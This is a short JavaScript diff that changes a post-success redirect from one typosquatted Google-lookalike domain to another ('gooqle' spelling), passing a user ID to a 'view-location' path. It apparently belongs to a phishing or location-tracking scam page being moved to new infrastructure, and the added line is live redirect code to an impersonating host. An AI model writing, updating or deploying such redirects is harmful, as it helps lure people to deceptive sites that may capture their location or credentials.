@@ -97,7 +97,7 @@ $(document).ready(function () {
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://view-gooqle-lives.shop/view-location/${userId}`;
+                            window.location.href = `https://gooqle-live.my.id/view-location/${userId}`;
                           }
                     
                 },
@@ -122,4 +122,5 @@ $(document).ready(function () {
     //     }
     // });
 });
+
 
